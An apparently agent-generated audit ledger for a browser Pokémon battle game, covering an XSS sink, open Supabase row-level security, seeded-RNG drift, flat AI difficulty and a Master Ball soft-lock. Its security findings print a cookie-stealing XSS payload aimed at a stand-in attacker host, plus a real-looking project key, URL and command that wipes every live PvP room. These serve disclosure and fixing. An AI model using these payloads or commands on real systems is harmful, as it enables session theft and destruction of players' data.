- [ISSUE-188] [P3] 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines) — `STORY_MODE_CATCH_INTEGRATION_RISK.md` (dx)
- [ISSUE-189] [P3] Doc `battle.html:LINE` anchors still stale (50 refs, 18 drifted) despite PR #140 "fix" — `STORY_MODE_CATCH_INTEGRATION_RISK.md` (dx)
- [ISSUE-190] [P3] 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines) — `STORY_MODE_FLOW.md` (dx)
- [ISSUE-191] [P3] STORY_MODE_FLOW.md PC cap of 10 contradicts shipped PC_BOX_CAP=30 — `STORY_MODE_FLOW.md` (data)
- [ISSUE-192] [P3] 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines) — `STORY_NARRATIVE_VARIANTS.md` (dx)
- [ISSUE-193] [P3] Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance — `STORY_TUTORIAL_SCENES` (dx)
- [ISSUE-194] [P3] Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline — `story-shop-buy-btn` (a11y)
- [ISSUE-195] [P3] Tutorial overlay's four-stage entrance animation has no reduced-motion fallback — `story-tutorial-overlay` (a11y)
- [ISSUE-196] [P3] Scope-leak audit (same class as fixed `sm` bug) — NEGATIVE: no other IIFE-internal symbol referenced bare from turn-loop scope — `storyAwareRng` (inconsistency)
- [ISSUE-197] [P3] `storyAwareRng()` helper exists but the combat engine still calls bare `Math.random()` at ~250 sites — `storyAwareRng` (dx)
- [ISSUE-198] [P3] Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile — `storyCatchMasterPulse` (a11y)
- [ISSUE-199] [P3] CONFIRMED FIXED — Hard coin mult floored to 1.00 (prior audit 2.1); Challenge 1.10 — `storyDifficultyCoinMult` (balance)
- [ISSUE-200] [P3] Hard mode still earns less gold per fight than Normal (1.00 vs 1.30) despite facing 1.15x-stronger foes — residual difficulty/economy asymmetry — `storyDifficultyCoinMult` (balance)
- [ISSUE-201] [P3] `storyRngNext` / per-engine-entry `rng` ternary accessor is **0.0003 ms (300 ns) per call** — no closure allocation penalty, accessor pattern is clean — `storyRngNext` (perf)
- [ISSUE-202] [P3] Status indicator toggles role="status" + aria-label onto a <div> at content-mutation time — `updateUI` (a11y)
- [ISSUE-203] [P3] `sm.wildSeenByEventIdx` and `sm.staticDrops` are lazily initialized instead of declared in the `sm` defaults block — `wildSeenByEventIdx` (dx)

---

## <a id="ISSUE-001"></a> ISSUE-001: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

---
id: ISSUE-001
severity: P0
category: security
anchor_symbol: applyBattleLogHtml
current_line_hint: ~223
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 965f251a0c94
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

**Evidence**:
```js
// online-pvp.js L214-231  — capture host's #battle-log innerHTML, push as raw string,
// guest re-injects with .innerHTML (no sanitization, no DOMPurify, nothing).
function captureBattleLogHtml() {
    const el = global.document && global.document.getElementById('battle-log');
    return el ? el.innerHTML : '';
}
function applyBattleLogHtml(html) {
    const el = global.document.getElementById('battle-log');
    if (!el) return;
    el.innerHTML = typeof html === 'string' ? html : '';  // <-- SINK
}
// L629, L657, L708, L722 push battle_log_html; L757, L782 apply it on the guest.
```

**Repro**: Combined with the open RLS finding above: attacker calls `client.from('pvp_rooms').update({ data: { ...prev, battle_log_html: '<img src=x onerror="fetch(`https://attacker/?c=`+document.cookie)">', seq: prev.seq+1 } }).eq('id', live_room_id)`. The realtime UPDATE arrives at every subscribed peer (host + guest), passes the `seq > lastRemoteSeq` gate, reaches `onOnlineRoomData` → `guestApplyBattleBlob` (L782) or `guestApplyBattleStart` (L757), which calls `applyBattleLogHtml(d.battle_log_html)` → arbitrary script executes in the victim's origin. Steals localStorage (including the Supabase session if ever upgraded to auth) and the player's display name; can render fake "you lost" screens; can pivot to the rest of `battle.html` globals.

**Blast radius**: Every live PvP match. Even without the open-RLS angle, any peer is implicitly trusted: a malicious *host* can already feed the guest arbitrary HTML on every turn. `logMsg` at battle.html:12972 does `div.innerHTML = processedMsg` where `processedMsg` interpolates `mon.name` into both attribute and text contexts (`data-mn="${enc}"` is escaped, but the textContent slot `>${moveName}</span>` is not — and `mon.name` for a Pokemon comes from team builds that flow through the draft pool, so any custom team upload with a crafted `name` field plants a payload in the host's log, which then ships to the guest verbatim).

**Fix sketch**: Either (a) don't transmit HTML — send the structured log entries (array of `{ msg, type, mon, move }`) and let each client format with the same `logMsg` template-safe path; or (b) hard-sanitize through DOMPurify before `innerHTML=` (allow only `<div class="log-…"><span class="…" data-mn="…">…</span></div>` — no scripts, no `on*` attributes, no `javascript:`). (a) is the architecturally right answer because it also eliminates the size-of-HTML bloat in `data.battle_log_html`.

**Verification**: New integration test: simulate a remote row with `battle_log_html: '<img src=x onerror="window.__xssFired=true">'`, run through `guestApplyBattleBlob`, assert `window.__xssFired === undefined`. Plus a unit test asserting `applyBattleLogHtml` strips `<script>`, `on*` attributes, and `javascript:` URLs.

---

## <a id="ISSUE-002"></a> ISSUE-002: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

---
id: ISSUE-002
severity: P0
category: security
anchor_symbol: pvp_rooms_update
current_line_hint: ~43
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: a1f5cf704e77
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L29-54  — ALL operations open to anon
-- "MVP: permissive policies for anon + authenticated clients using the anon key.
--  Tighten later (e.g. restrict updates to room owner, RPC join-by-code only)."
create policy "pvp_rooms_update" on public.pvp_rooms for update
  to anon, authenticated using (true) with check (true);
create policy "pvp_rooms_delete" on public.pvp_rooms for delete
  to anon, authenticated using (true);
create policy "pvp_rooms_insert" on public.pvp_rooms for insert
  to anon, authenticated with check (true);
```

**Repro**: With the publishable key from `online-config.js` (`sb_publishable_vLGEm7Ha50A9IhdnKdCoFA_znkPGI6i`) and `https://ynblrcxpubfevqgieuuo.supabase.co`, any third party can: `await client.from('pvp_rooms').delete().neq('id', '00000000-0000-0000-0000-000000000000')` — wipes every active match. Or `update().eq('id', target_room_id).set({data: { ...attacker_blob }})` — hijacks a match mid-draft to inject a chosen team for the opponent. Or `select('code, data')` — scrape every live game's draft picks.

**Blast radius**: Catastrophic for the online-PvP feature. The 002 migration added an atomic `try_join_pvp_room` RPC to fix one TOCTOU, but the underlying UPDATE policy remained wide open — every other write path (`pushData`'s `update().eq('id', roomId)` at L492) trusts the client and there is zero server-side guarantee that the writing client owns the room. This is exactly the "fix later" note that never got applied. All concurrency analysis below assumes a well-behaved peer; under the current RLS, a hostile peer with the anon key can override any of those guarantees by writing directly to the row.

**Fix sketch**: At minimum, route every write through SECURITY DEFINER RPCs that check a per-room caller token (host generates a UUID on createRoom, embedded in `data.host_token` & returned only to host; guest receives a different token via `try_join_pvp_room`). UPDATE policy then becomes `using ((data->>'host_token' = current_setting('request.header.x-pbs-token', true)) OR (data->>'guest_token' = current_setting('request.header.x-pbs-token', true)))`. DELETE policy should be host-only or RPC-only. SELECT can stay permissive (so spectators / rejoins work) but redact draft picks until phase='battle' if competitive integrity matters.

**Verification**: From a fresh browser, with no room joined, attempt `client.from('pvp_rooms').update({ data: { hostile: true } }).eq('id', '<live-room-id>')` — must return `error: row-level security policy violated` instead of silently succeeding.

---

## <a id="ISSUE-003"></a> ISSUE-003: Player gimmick gate reads bare IIFE-private `sm` — always sees zero unlocked gimmicks

---
id: ISSUE-003
severity: P1
category: inconsistency
anchor_symbol: _withStoryPlayerGimmickGate
current_line_hint: ~11376
file: battle.html
agents: [consistency-auditor]
fingerprint: 416fa2aaed61
confidence: high
status: open
---

**Title**: Player gimmick gate reads bare IIFE-private `sm` — always sees zero unlocked gimmicks

**Evidence**:
```js
// line 11376, inside _withStoryPlayerGimmickGate (script-top, before the IIFE)
window._pbsStoryUnlockedGimmicks = (typeof sm !== 'undefined' && sm && Array.isArray(sm.unlockedGimmicks)) ? sm.unlockedGimmicks : [];
```

**Repro**: `sm` is private to the StoryMode IIFE (declared line 31724). `typeof sm` is always `'undefined'` here, so the ternary always yields `[]`. Every player-side acquisition path wrapped by this gate (incl. Cable Link per STORY_MODE_FLOW §15d) therefore sees an empty unlocked-gimmick list.

**Blast radius**: Mega / Z / Dynamax / Tera silently never roll on player-side acquisitions in story mode, even after the player has unlocked them. Not a crash (typeof-guarded) — a silent gameplay regression of the same scope-leak class.

**Fix sketch**: Read the live state via the public getter: `const sm = (window.StoryMode && window.StoryMode.state) || null;` then use it, matching the pattern at lines 13858+.

**Verification**: In a story run with mega unlocked, confirm `window._pbsStoryUnlockedGimmicks` includes `'mega'` during a player build roll.

---

## <a id="ISSUE-004"></a> ISSUE-004: aiDecision early-returns null on any choiceLock — AI cannot switch out of an immune/walled lock

---
id: ISSUE-004
severity: P1
category: bug
anchor_symbol: aiDecision
current_line_hint: ~19434
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 7413698eff37
confidence: high
status: fixed-claude/ecstatic-gauss-RY5hA
---

**Title**: aiDecision early-returns null on any choiceLock — AI cannot switch out of an immune/walled lock

**Evidence**:
```js
function aiDecision() {
    let attacker = state.fActive, defender = state.pActive;
    if (attacker.volatile.choiceLock) return null;   // <-- blocks ALL switches while choice-locked
    ...
```
Choice lock prevents changing *moves*, not switching Pokémon. This conflates the two: a choice-locked mon CAN legally switch, but the AI refuses to, so it is stranded re-using the locked move (paired with the getBestMove finding above).

**Repro**: `node scripts/debug/_repro/issue1-immune-spam.mjs` case (c): Choice-Specs Manectric locked into Thunderbolt vs Lightning Rod, with a Garchomp on the bench that would dominate the matchup. `aiDecision()` returns `null` (refuses to switch). `issue1-robust.mjs` confirms `aiDecision: null` while trapped.

**Blast radius**: Combines with finding 844cf5ce029b into a hard, inescapable loop the player triggers at will: switch an immunity/hard-wall into a choice-locked foe and it never threatens again. Whole-team-feed potential if the player keeps the wall healthy.

**Fix sketch**: Remove the blanket `choiceLock` early-return (or gate it): a choice-locked attacker should still be allowed to switch when its locked move is immune/zeroed or it is `willDieFirst`/hard-walled. Only true trapping (partialTrap, Arena Trap/Shadow Tag/Magnet Pull, ingrain — already handled just below) should force `null`.

**Verification**: Re-run case (c); with a strong bench it should return a switch index. Confirm `tests/property/priority-order` and existing ai-decision suites still pass (no regression in legitimate "don't switch, just attack" cases).

---

## <a id="ISSUE-005"></a> ISSUE-005: Difficulty tiers scale only enemy stats; AI policy is byte-identical at every tier — no rising *challenge*, just a rising stat-wall

---
id: ISSUE-005
severity: P1
category: balance
anchor_symbol: applyFoeDifficultyScaling
current_line_hint: ~13993
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1ebee7303e60
confidence: high
status: open
---

**Title**: Difficulty tiers scale only enemy stats; AI policy is byte-identical at every tier — no rising *challenge*, just a rising stat-wall

**Evidence**:
```js
// applyFoeDifficultyScaling (13993) — the entire "difficulty" knob is a stat multiplier:
if (d === 'veryeasy') mult = 0.70; else if (d === 'easy') mult = 0.85;
else if (d === 'hard') mult = 1.15; else if (d === 'challenge') mult = 1.30; // "Very Hard"
mult *= _earlyGameFoeStatMult(); mult *= window._stageGatedFoeStatMult();
// ...then mon.maxHp/stats *= mult.  getBestMove (18835-19310) and aiDecision
// (19313-19389) contain ZERO reads of storyDifficulty / sm.badges / tier / skill.
```

**Repro**: `scripts/debug/_repro/real-ai-test.mjs` (uses a non-stubbing loader; the test harness at tests/helpers/load-engine.js:229 replaces getBestMove with a slot-0 stub, so the real policy must be exercised directly). Charizard vs Venusaur, same seed, veryeasy vs challenge: the **real getBestMove picks the identical move 100/100 seeds** (Flamethrower), while foe HP scales 1.85x and Atk 1.875x. Static grep: `awk 'NR>=18835&&NR<=19310' battle.html | grep -E 'difficulty|badges|tier|skill'` returns nothing.

**Blast radius**: Whole story curve VERY EASY->VERY HARD. The AI is already maximally competent at GL1 (type/KO/priority/switch/hazard/status-aware, considers the player's full party for hazards). "Higher difficulty" therefore = bigger numbers on the same brain. A Very Hard foe is a Very Easy foe with +85% HP/Atk, not a smarter opponent. This is the core gap vs the maintainer's "AI gets genuinely smarter at higher tiers" goal — quantified gap between low- and high-tier AI behavior is **zero**.

**Fix sketch**: Introduce an AI-competence axis gated on tier/badges (e.g., low tiers add larger random move jitter, disable switching/healing/setup heuristics, and ignore the player's bench; high tiers enable the full policy). Tie it to `storyDifficulty` and/or GL so behavior — not just stats — ramps.

**Verification**: Re-run real-ai-test.mjs after the change; assert the move/switch distribution diverges between veryeasy and challenge for matchups with a non-trivial best line.

---

## <a id="ISSUE-006"></a> ISSUE-006: Sleep duration roll uses bare `Math.random()` (RNG drift on every sleep proc)

---
id: ISSUE-006
severity: P1
category: bug
anchor_symbol: applyStatus
current_line_hint: ~25882
file: battle.html
agents: [battle-engine-debugger, consistency-auditor]
fingerprint: 07e77424454f
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Sleep duration roll uses bare `Math.random()` (RNG drift on every sleep proc)

**Evidence**:
```js
// battle.html:25882
if (status === "SLP") mon.sleepDuration = Math.floor(Math.random() * 3) + 1;
```

Duration determines wake-up turn count, checked every turn in `canMove` (line 24221). Diverges every sleep proc.

**Repro**: Save before a foe is put to sleep with a fixed seed; reload — sleep duration varies. Distribution confirmed correct (1–3 spread matches Showdown), but the value is non-deterministic across replays.

**Blast radius**: Every Sleep Powder / Spore / Hypnosis / Dark Void proc. Sleep Talk move selection (line 20077, also bare) compounds the drift.

**Fix sketch**: `const _r = (sm && sm.active) ? storyRngNext : Math.random; mon.sleepDuration = Math.floor(_r() * 3) + 1;` Apply same pattern to Sleep Talk move pick at line 20077.

**Verification**: Two story replays at the same seed produce identical wake-up timing.

---

## <a id="ISSUE-007"></a> ISSUE-007: League foe stat boost stacks multiplicatively despite comment claiming additive merge

---
id: ISSUE-007
severity: P1
category: bug
anchor_symbol: applyStoryLeagueFoeStatBoost
current_line_hint: ~30729
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7ce8a9ce8254
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: League foe stat boost stacks multiplicatively despite comment claiming additive merge

**Evidence**:
```js
// battle.html ~30729  applyStoryLeagueFoeStatBoost
const newMaxHp = Math.max(1, Math.floor(mon.maxHp * hpM));   // direct multiply
mon.maxHp = newMaxHp;                                         // mutates mon.maxHp directly
// no `mon._leagueStatBonus = { hp, bulk, spe }` write ANYWHERE

// battle.html ~13244  applyFoeDifficultyScaling (called AFTER the boost)
//  > League boost ... is stored as additive deltas on the mon by
//  > applyStoryLeagueFoeStatBoost so difficulty and boss boost stack
//  > ADDITIVELY (not multiplicatively).
const lb = mon._leagueStatBonus;          // always undefined
const hpMult = mult + (lb && lb.hp ? lb.hp : 0);  // hpMult = mult (no add)
const newMaxHp = Math.max(1, Math.floor(mon.maxHp * hpMult));  // hpM already applied above → MULTIPLIES AGAIN
```
`grep -nE "_leagueStatBonus" battle.html` returns exactly one hit (the read site). No writer exists.

**Repro**: Fight Champion on Hard mode. HP multiplier = `1.40` (league) × `1.15` (Hard) × `1.20` (`_stageGatedFoeStatMult` for Champion) = **×1.932**, not the documented "1.30 ×1.40 = 1.82 cliff" the additive shim was supposed to flatten. The "cliff" the comment claims was fixed is in fact still there, plus an extra ×1.20 stage-gate term.

**Blast radius**: Every story-mode E1-E4 / Champion / League Rival / post-HoF Mystery foe fight on Easy/Hard/Challenge. Crucible Hard Mode rematches stack a 4th multiplier (×1.30) on top, pushing Champion-rematch HP to base ×2.09+ on Hard+Hard, plausibly higher than playtested.

**Fix sketch**: Either (a) make the comment match reality (it's intentionally multiplicative — drop the additive narrative), or (b) implement the missing writer in `applyStoryLeagueFoeStatBoost`: store `mon._leagueStatBonus = { hp: hpM-1, bulk: bulkM-1, spe: speM-1 }` *instead of* mutating maxHp, and let `applyFoeDifficultyScaling` apply the merged multiplier. Option (b) is the harder fix but matches the intent encoded in the read site.

**Verification**: After (b): a Champion fight on Hard with league boost 1.40 + difficulty 1.15 should have foe HP ≈ `base * (1 + 0.40 + 0.15) = base * 1.55`, not `base * 1.40 * 1.15 = base * 1.61`. The Hard / Normal gap should be the bare 0.15 delta, not 0.21.

---

## <a id="ISSUE-008"></a> ISSUE-008: Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented

---
id: ISSUE-008
severity: P1
category: inconsistency
anchor_symbol: BLACK_MARKET_ITEMS
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 580596d9a9df
confidence: high
status: wontfix-DE-SCOPED-permanent
---

**Title**: Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented

**Evidence**:
```
$ grep -nE 'BLACK_MARKET|blackMarket|BlackMarket|black_market' battle.html
(no matches)
```

**Repro**: Open any City5+ hub, look for a Black Market button beside Mart / Department Store. Buttons absent regardless of progression. Spec promises `enterBlackMarket()` modal w/ Rare Candy / Mystery Egg / Forged Pass / Black Market TM / Intel Dossier / Fence / Shady Repel / Legend Chip SKUs, gated by `sm.blackMarketUnlocked && cityIdx >= 5`.

**Blast radius**: Six spec sections (§3, §3.5, §8, §10) hang off this; no `sm.blackMarketUnlocked` flag, no `enterBlackMarket()` route, no DX or QA pass possible. README §44 doesn't currently claim it, but `docs/STORY_FEATURES_INTEGRATION.md` is treated as canonical for the design vision, and the prior May 2026 audit ranked this #3 in priority — still unshipped.

**Fix sketch**: Author `BLACK_MARKET_ITEMS` const next to `POKEMART_ITEMS`/`DEPT_ITEMS` (anchor ~battle.html:28876 for the mart catalog), add `sm.blackMarketUnlocked` migration in a new `migrateStoryPreV20`, and add an `enterBlackMarket()` route + city-action button gated on `(sm.blackMarketUnlocked && getCityIndex() >= 5)`.

**Verification**: After implementation, `grep -nE 'BLACK_MARKET_ITEMS|enterBlackMarket' battle.html` returns ≥3 hits and a visit to City5 after itinerary beat shows the Black Market button.

---

## <a id="ISSUE-009"></a> ISSUE-009: `canMove` paralysis + confusion self-hit checks use bare `Math.random()` (RNG drift in story replays)

---
id: ISSUE-009
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~24232
file: battle.html
agents: [battle-engine-debugger]
fingerprint: ffc310969bdf
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `canMove` paralysis + confusion self-hit checks use bare `Math.random()` (RNG drift in story replays)

**Evidence**:
```js
// battle.html:24232 (PAR full-paralysis)
if (mon.status === "PAR" && Math.random() < 0.25) { logMsg(`${mon.name} is paralyzed!`, 'status'); return false; }
// battle.html:24257 (confusion self-hit)
else if (Math.random() < 0.3333) { /* confusion self-hit */ }
```

The sibling ice-thaw site at 24228 was already fixed (`const _thawRng = (sm && sm.active) ? storyRngNext : Math.random;`). Paralysis and confusion in the *same handler* were not updated.

**Repro**: In a story run with fixed `sm.runSeed`, save right before a PAR/confused mon's turn; reload twice. PAR full-para and confusion self-hit differ across loads because they consume native `Math.random()` instead of the seeded `_strngState` stream.

**Blast radius**: Every `canMove` call (twice per turn). All seeded replays. `story-replay.mjs` determinism is broken every time PAR/Confusion fires.

**Fix sketch**: Mirror the line-24228 pattern: `const _r = (sm && sm.active) ? storyRngNext : Math.random; if (mon.status === "PAR" && _r() < 0.25) ...` Same for line 24257.

**Verification**: Run `npm run debug:replay diff <seed>`; post-fix should be byte-identical across two replay invocations.

---

## <a id="ISSUE-010"></a> ISSUE-010: Sleep wake-check is off-by-one — ~1/3 of sleeps cost 0 turns (instant wake, mon acts same turn)

---
id: ISSUE-010
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~25408
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 1a2a30d45840
confidence: high
status: open
---

**Title**: Sleep wake-check is off-by-one — ~1/3 of sleeps cost 0 turns (instant wake, mon acts same turn)

**Evidence**:
```js
// canMove() — battle.html:25406
if (mon.status === "SLP") {
    mon.statusTurns++;                       // pre-increment BEFORE the wake check
    let wakeThreshold = mon.sleepDuration || 2;
    if (mon.ability === "Early Bird") wakeThreshold = Math.ceil(wakeThreshold / 2);
    if (mon.statusTurns >= wakeThreshold) { mon.status = null; ...; return true; }  // wakes AND acts this turn
```
`applyStatus` sets `mon.sleepDuration = Math.floor(Math.random()*3)+1` → {1,2,3}. With the pre-increment + `>=`,
a roll of `sleepDuration===1` makes `statusTurns` 0→1, `1 >= 1` true → the mon wakes and acts on the SAME turn it
would first try to move = **0 turns truly asleep**. Effective lost-actions distribution is {0,1,2}, not Showdown's
{1,2,3}. ISSUE-006 (fixed) addressed only the RNG *determinism* of the roll and explicitly (and incorrectly)
asserted "1–3 spread matches Showdown" — the wake arithmetic, not the roll, is the deviation. Not in
tests/reports/deviations.md.

**Repro**: `node scripts/debug/_repro/sleep-real.mjs` — foe set to `status='SLP', sleepDuration=1` (a ~1/3 roll).
Output: `Gengar woke up! | Gengar used Shadow Ball!` on turn 1 — i.e. `woke===true && foeActed===true`, the sleep
cost zero actions. Showdown forces the sleeper to lose at least one action. Also `scripts/debug/_repro/sleep-duration.mjs`
prints lost-actions per duration: 1→0, 2→1, 3→2.

**Blast radius**: Every sleep-inducing move (Spore, Sleep Powder, Hypnosis, Lovely Kiss, Dark Void, Yawn, Rest-on-foe
via tricks). Spore/Hypnosis leads lose ~33% of their value; a "sleep then set up" line frequently gives the opponent a
free turn. Interacts with ISSUE-061 (Spore scored 100 by AI) — the AI over-values a status that under-delivers. Rest
(self-sleep, 2 turns) wakes after only 1 lost action instead of 2, so the user is vulnerable a turn early.

**Fix sketch**: Make the asleep duration count lost actions directly. Either (a) roll `sleepDuration = floor(rand*3)+1`
and use a strict `>` so `statusTurns > sleepDuration` wakes after exactly `sleepDuration` asleep turns; or (b) keep `>=`
but roll `floor(rand*3)+2` (={2,3,4}) so the minimum is 1 lost action — matching Showdown's `random(2,5)` internal
counter. Apply the same audit to `Early Bird` (currently `ceil(threshold/2)`: with threshold 1 it stays 1 → still
instant wake).

**Verification**: Re-run `sleep-real.mjs` with `sleepDuration` set to the minimum roll; the foe must log `is fast
asleep.` and NOT act on turn 1. Add a `status.test.js` case: put a mon to sleep with the minimum roll, assert it loses
≥1 action before waking.

---

## <a id="ISSUE-011"></a> ISSUE-011: `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext`

---
id: ISSUE-011
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~24232
file: battle.html
agents: [consistency-auditor]
fingerprint: 39f6ad985c2c
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext`

**Evidence**:
```js
// L24227-24230  (FRZ thaw — already deterministic)
if (mon.status === "FRZ") {
    const _thawRng = (sm && sm.active) ? storyRngNext : Math.random;
    if (_thawRng() < 0.2) { mon.status = null; logMsg(`${mon.name} thawed out!`, 'info'); return true; }
    logMsg(`${mon.name} is frozen solid!`, 'status'); return false;
}
// L24232 (PAR fizzle — STILL BARE)
if (mon.status === "PAR" && Math.random() < 0.25) { logMsg(`${mon.name} is paralyzed! It can't move!`, 'status'); return false; }
// L24257 (confusion self-hit — STILL BARE)
else if (Math.random() < 0.3333) {
    // Confusion self-hit ...
```

**Repro**: Story battle, seed it, paralyze the player's mon. Replay with same seed — paralysis "can't move" / "moves through it" outcomes will not match across replays.

**Blast radius**: Same class as the parseMoveEffects cluster, but in the very-hot path that runs every turn. Drift is more visible because PAR fizzles change whether a move lands at all (cascades into damage rolls, KOs, and switch order).

**Fix sketch**: Add the same `_rng = (sm && sm.active) ? storyRngNext : Math.random` shim at the top of `canMove` and replace L24232 PAR fizzle and L24257 confusion self-hit. The freeze branch already does this; copy the same idiom.

**Verification**: Seeded-replay test where the player's lead is PAR'd on turn 1 — assert PAR fizzle outcomes match across two seeded runs. Same for confusion self-hit.

---

## <a id="ISSUE-012"></a> ISSUE-012: Ball inventory + `catchMode` flag in STORY_FEATURES_INTEGRATION §1/§2/§5 do not match shipped code

---
id: ISSUE-012
severity: P1
category: inconsistency
anchor_symbol: catchMode
current_line_hint: ~44680
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 4592b2ea36ea
confidence: high
status: open
---

**Title**: Ball inventory + `catchMode` flag in STORY_FEATURES_INTEGRATION §1/§2/§5 do not match shipped code

**Evidence**:
```js
// SPEC (docs/STORY_FEATURES_INTEGRATION.md §1):
//   Inventory: sm.inventory.pokeball / greatBall / ultraBall / masterBall
//   Sold at Poke Mart only when `catchMode` is on
// CODE (battle.html ~44680, ball render loop):
ballRows = ['poke','great','ultra','master'].map(k => {
    const have = (sm.balls && (sm.balls[k] | 0)) || 0;   // sm.balls.poke, NOT sm.inventory.pokeball
    ...onclick="window.StoryMode.catchThrow('${k}')"
// grep 'catchMode' battle.html -> 0 hits; catching is gated by STORY_BATTLE_INTERRUPTS + _shouldFireWildBeforeBattle, not a setting.
```

**Repro**: `grep -nE "sm\.inventory\.(pokeball|greatBall)|catchMode" battle.html` → 0 hits. Catch UI is live (`#screen-story-catch`, `catchThrow`), balls live at `sm.balls.{poke,great,ultra,master}`. STORY_MODE_AUDIT already noted "catchMode undefined / mart forgets balls"; this finding pins the *exact field-path drift* still present in the canonical integration spec.

**Blast radius**: Anyone implementing the spec'd Mart ball-rows (§1), the PC auto-deposit gate (§2 keys on `catchMode || sm.pcBox.length>0`), or the `eventsOn off / catch still works if catchMode on` rule (§8) will code against fields that don't exist. The shipped design uses a different model (interrupt-driven wilds, `sm.balls`), so the integration spec mis-describes its own foundation.

**Fix sketch**: Update STORY_FEATURES_INTEGRATION §1/§2/§5/§8 to reference `sm.balls.{poke,great,ultra,master}` and the actual gate (`STORY_BATTLE_INTERRUPTS` / wild-route interrupt + `classicMode` for gimmick-restriction), or rename a real toggle to `catchMode` if one is intended. Read-only audit — do not edit the spec here; file is the doc-owner's call.

**Verification**: After reconciliation, `grep -nE "sm\.balls|STORY_BATTLE_INTERRUPTS" battle.html` matches the field names quoted in §1/§2; `catchMode` either exists in code or is struck from the spec.

---

## <a id="ISSUE-013"></a> ISSUE-013: The unique Master Ball can be wasted on any wild — soft-locks the Caged God capture (only 1% catch rate without it)

---
id: ISSUE-013
severity: P1
category: bug
anchor_symbol: catchThrow
current_line_hint: ~45155
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7856b112bcd7
confidence: high
status: open
---

**Title**: The unique Master Ball can be wasted on any wild — soft-locks the Caged God capture (only 1% catch rate without it)

**Evidence**:
```js
} else {
    if (_catchState.safariMode) return;
    if (!sm.balls || (sm.balls[ballKey] | 0) <= 0) return;
    sm.balls[ballKey] = (sm.balls[ballKey] | 0) - 1;   // master ball decremented like any ball
}
```

**Repro**: The Master Ball is granted exactly once, at post-HoF boss-arc unlock (`sm.balls.master += 1`, ~line 48863) and is deliberately never re-granted (comment at ~41676: "keeping the Master Ball uniquely tied to the Caged God arc"; the 100-dex milestone substitutes a trophy bundle). But every regular catch encounter renders Master Ball as a throwable option (`['poke','great','ultra','master']`, ~line 45008) and `catchThrow` decrements it with no guard. After HoF the player can encounter wilds via the Crucible (`crucibleWildEncounter`) or a re-queued roaming legendary and burn the Master Ball there. The Caged God uses `forcedCatchRate: 0.01` (`bossEnterCage`, ~44160) — with the Master Ball gone, the boss is ~1% per non-Master throw, no guaranteed catch remains.

**Blast radius**: Caged God post-game arc (capture is the whole payoff — Subject Zero + a 10,000G/full-vitamin reward bundle). A player who wastes the ball before collecting the 3 city leads has no recovery path short of grinding 1% throws.

**Fix sketch**: Either (a) hide / disable the Master Ball button outside boss mode (it has no legitimate non-boss use given it's unique), or (b) keep it throwable but re-grant a replacement on cage-unlock if `sm.balls.master === 0`, or (c) make the boss catch fall back to guaranteed on first ball if no Master Ball is held. Option (a) matches the narrative ("saved for that one fight", ~line 10610).

**Verification**: Post-HoF, throw the Master Ball at a Crucible wild, then collect 3 leads and enter the cage — confirm the player can still catch Subject Zero (button present or auto-guaranteed).

---

## <a id="ISSUE-014"></a> ISSUE-014: Unique Master Ball can be wasted on any non-boss wild (Crucible wild encounter), soft-locking the Caged God capture — VERIFIED still present post-merge

---
id: ISSUE-014
severity: P1
category: bug
anchor_symbol: catchThrow
current_line_hint: ~45205
file: battle.html
agents: [story-mode-investigator]
fingerprint: fde69214ddbf
confidence: high
status: open
---

**Title**: Unique Master Ball can be wasted on any non-boss wild (Crucible wild encounter), soft-locking the Caged God capture — VERIFIED still present post-merge

**Evidence**: Ledger ISSUE-013, re-verified against current code. After the post-HoF Mystery Figure climax, the player is handed the one and only Master Ball immediately (~48954: `sm.balls.master = (sm.balls.master|0) + 1`) and told to go collect the 3 cage leads. While holding it, the post-game `crucibleWildEncounter()` (~43781) opens a normal catch screen, and `catchThrow('master')` (~45205) has NO boss/uniqueness guard:
```js
if (!sm.balls || (sm.balls[ballKey] | 0) <= 0) return;
sm.balls[ballKey] = (sm.balls[ballKey] | 0) - 1;   // master decremented like any ball
...
const chance = mult === Infinity ? 1 : ...;          // master = guaranteed catch on ANY wild
```
The Caged God catch uses `forcedCatchRate: 0.01` (~44225) — designed around the Master Ball's guaranteed catch. With the Master Ball spent on a Crucible wild, the player faces a ~1% catch rate on the unique boss → effective soft-lock of the run's apex reward.

